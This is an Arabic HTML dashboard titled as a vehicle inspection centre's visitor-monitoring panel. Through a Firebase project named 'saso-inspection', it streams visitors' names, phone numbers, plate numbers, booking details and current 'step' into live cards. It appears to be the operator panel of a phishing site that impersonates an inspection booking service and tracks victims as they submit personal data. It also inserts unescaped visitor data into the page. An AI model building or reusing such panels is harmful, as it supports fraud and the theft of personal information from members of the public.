<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - مراقبة الزوار</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 20px;
            direction: rtl;
        }
        h2 {
            text-align: center;
            color: #1e7344;
            margin-bottom: 30px;
        }
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .user-card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            padding: 20px;
            border-right: 5px solid #1e7344;
            transition: transform 0.2s;
            position: relative;
        }
        .user-card:hover {
            transform: translateY(-5px);
        }
        .status-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: #e8f5e9;
            color: #2e7d32;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
        }
        .info-item {
            margin-bottom: 10px;
            font-size: 14px;
            border-bottom: 1px f9f9f9 solid;
            padding-bottom: 5px;
        }
        .label {
            color: #888;
            font-weight: bold;
            display: inline-block;
            width: 90px;
        }
        .value {
            color: #333;
            font-weight: 600;
        }
        .plate-value {
            color: #d93025;
            background: #fff5f5;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .time-ago {
            font-size: 11px;
            color: #999;
            margin-top: 15px;
            text-align: left;
        }
    </style>
</head>
<body>

    <h2>لوحة تحكم مركز فحص المركبات</h2>
    <div id="visitor-list" class="dashboard">
        </div>

    <script>
        // إعدادات الفايربيس (نفس التي تستخدمها في الموقع)
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.appspot.com",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        // مراقبة مسار الزوار (visitors) وتحديث اللوحة فوراً
        db.ref('visitors').on('value', (snapshot) => {
            const listContainer = document.getElementById('visitor-list');
            listContainer.innerHTML = ''; // مسح القائمة القديمة لتحديثها

            const data = snapshot.val();
            if (data) {
                // تحويل البيانات لمصفوفة لترتيبها (الأحدث أولاً)
                const visitorsArray = Object.keys(data).map(key => ({
                    id: key,
                    ...data[key]
                })).reverse();

                visitorsArray.forEach(visitor => {
                    const card = document.createElement('div');
                    card.className = 'user-card';
                    
                    card.innerHTML = `
                        <div class="status-badge">${visitor.step || 'متواجد حالياً'}</div>
                        <div class="info-item"><span class="label">الاسم:</span> <span class="value">${visitor.fullName || 'غير معروف'}</span></div>
                        <div class="info-item"><span class="label">الهاتف:</span> <span class="value">${visitor.phone || '-'}</span></div>
                        <div class="info-item"><span class="label">نوع المركبة:</span> <span class="value">${visitor.vehicleType || '-'}</span></div>
                        <div class="info-item"><span class="label">رقم اللوحة:</span> <span class="value plate-value">${visitor.plateNumber || '-'}</span></div>
                        <div class="info-item"><span class="label">المنطقة:</span> <span class="value">${visitor.region || '-'}</span></div>
                        <div class="info-item"><span class="label">المركز:</span> <span class="value">${visitor.center || '-'}</span></div>
                        <div class="info-item"><span class="label">الموعد:</span> <span class="value">${visitor.bookingDate || '-'} | ${visitor.bookingTime || '-'}</span></div>
                        <div class="time-ago">آخر نشاط: ${visitor.lastUpdate || 'غير مسجل'}</div>
                    `;
                    listContainer.appendChild(card);
                });
            } else {
                listContainer.innerHTML = '<p style="text-align:center; width:100%;">لا يوجد زوار حالياً...</p>';
            }
        });
    </script>
</body>
</html>
